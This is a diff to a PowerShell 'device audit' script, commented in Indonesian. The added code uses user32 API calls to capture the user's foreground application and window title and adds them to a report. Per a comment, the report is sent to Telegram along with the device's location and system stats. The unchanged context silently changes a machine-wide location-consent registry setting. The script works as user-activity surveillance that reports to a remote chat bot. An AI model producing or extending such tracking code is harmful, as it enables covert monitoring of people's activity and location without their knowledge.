@@ -147,6 +147,56 @@ try {
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" -Name "Value" -Value "Deny" -ErrorAction SilentlyContinue
 } catch {}
 
+# --- DETEKSI APLIKASI YANG SEDANG DIBUKA USER (ANTI-DUPLIKASI) ---
+$CurrentActivity = "Idle / No Active Window"
+
+try {
+    # 1. Cek apakah tipe sudah ada di AppDomain saat ini
+    # Kita gunakan format Assembly-Qualified Name atau pencarian manual agar aman
+    $TypeExists = $false
+    foreach ($Assembly in [AppDomain]::CurrentDomain.GetAssemblies()) {
+        if ($Assembly.GetType("WinAPI.User32Win")) {
+            $TypeExists = $true
+            break
+        }
+    }
+
+    # 2. Jika BELUM ada, baru kita kompilasi C#-nya
+    if (-not $TypeExists) {
+        $Signature = @'
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetForegroundWindow();
+        [DllImport("user32.dll")]
+        public static extern int GetWindowThreadProcessId(IntPtr hWnd, out int lpdwProcessId);
+'@
+        Add-Type -MemberDefinition $Signature -Name "User32Win" -Namespace "WinAPI" -ErrorAction SilentlyContinue | Out-Null
+    }
+
+    # 3. Eksekusi pemanggilan API (Gunakan namespace penuh secara dinamis)
+    $ActiveWindowHandle = [WinAPI.User32Win]::GetForegroundWindow()
+
+    if ($ActiveWindowHandle -and $ActiveWindowHandle -ne [IntPtr]::Zero) {
+        $ProcessId = 0
+        $ReturnId = [WinAPI.User32Win]::GetWindowThreadProcessId($ActiveWindowHandle, [ref]$ProcessId)
+
+        if ($ProcessId -gt 0) {
+            $ActiveProcess = Get-Process -Id $ProcessId -ErrorAction SilentlyContinue
+            if ($ActiveProcess) {
+                $AppName = $ActiveProcess.ProcessName
+                $WindowTitle = $ActiveProcess.MainWindowTitle
+
+                if ([string]::IsNullOrEmpty($WindowTitle)) { 
+                    $WindowTitle = "System Process / Background Task" 
+                }
+                $CurrentActivity = "$AppName ($WindowTitle)"
+            }
+        }
+    }
+} catch {
+    # Mengamankan agar skrip tidak crash dan tetap mengirim data ke Telegram
+    $CurrentActivity = "Error: $($_.Exception.Message)"
+}
+
 # --- LOGIKA TAMPILAN LOKASI ---
 if (!$Location.IsUnknown) {
     $Lat = $Location.Latitude.ToString().Replace(",", ".")
@@ -171,6 +221,7 @@ $Message = "📍 *AUDIT DEVICE REPORT*`n" +
            "📁 *Disk:* $DiskUsage % | *🎨 *GPU:* $GPUUsage %`n" +
            "🔋 *Battery:* $BatteryString`n" +
            "📶 *Network:* $NetUsage Kbps`n" +
+           "🎯 *Active App:* $CurrentActivity`n" +
            "⏱️ *Uptime:* $UptimeString`n" +
            "━━━━━━━━━━━━━━━━━━`n" +
            "💾 *SPACE STORAGE STATUS:*`n$DiskReport" +
